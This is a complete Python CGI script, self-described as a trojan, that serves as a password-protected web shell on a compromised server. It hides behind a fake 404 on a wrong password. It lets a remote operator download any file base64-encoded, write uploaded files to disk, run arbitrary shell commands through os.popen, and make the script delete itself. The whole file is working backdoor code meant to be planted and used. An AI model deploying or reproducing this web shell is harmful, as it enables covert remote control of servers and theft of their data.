#!/usr/bin/env python

# Tested on python 2.7.3 on Debian Wheezy.
#
# To test this trojan locally, configure Apache (etc) to serve this file as a
# cgi bin

# TODO: Change this password. Don't leave the default!
PASSWORD = 'the-password'

# dependencies
import base64
import json
import os
import sys

# read and parse stdin
post = json.loads(sys.stdin.read())

# feign non-existence if the authentication is invalid
if post['auth'] != PASSWORD:
    print 'status: 404'
    print
    sys.exit()

# return JSON to the client
print 'content-type: application/json'
print


# file-download payload
def payload_download(cwd, args):

    # cd to the trojan's cwd 
    os.chdir(cwd)

    # open the file as binary, and base64-encode its contents
    try:
        with open(args['file'], 'rb') as f:
            stdout = base64.b64encode(f.read())
            stderr = []

    # notify the client on failure
    except IOError as e:
        stdout = []
        stderr = [ 'Could not download file.', e.strerror ]

    print json.dumps({ 'stdout': stdout, 'stderr': stderr, 'cwd': cwd })


# file-upload payload
def payload_upload(cwd, args):

    # cd to the trojan's cwd 
    os.chdir(cwd)

    # base64-decode the uploaded bytes, and write them to a file
    try:
        with open(args['dst'], 'w') as f:
            f.write(base64.b64decode(args['data']))
            stdout = [ 'File saved to {0}.'.format(args['dst']) ]
            stderr = []

    # notify the client on failure
    except IOError as e:
        stdout = []
        stderr = [ 'Could not save file:', e.strerror ]

    print json.dumps({ 'stdout': stdout, 'stderr': stderr, 'cwd': cwd })


# trojan autodestruct
def payload_autodestruct(cwd, args):

    # attempt to delete the trojan
    try:
        os.remove(__file__)
        stdout = [ 'File {0} has autodestructed.'.format(__file__) ]
        stderr = []

    # notify the client on failure
    except OSError as e:
      stdout = []
      stderr = [ 'File {0} could not autodestruct.'.format(__file__), e.strerror]

    print json.dumps({ 'stdout': stdout, 'stderr': stderr, 'cwd': cwd })


# if `cmd` is a trojan payload, execute it
try:
    payload = globals()[ post['cmd'] ]
    payload(post['cwd'], post['args'])

# otherwise, execute a shell command
except:
    cmd    = 'cd {0}; {1} 2>&1; pwd'.format(post['cwd'], post['cmd'])
    output = os.popen(cmd).read().rstrip().split('\n')
    cwd    = output.pop()
    print json.dumps({ 'stdout': output, 'stderr': [], 'cwd': cwd })
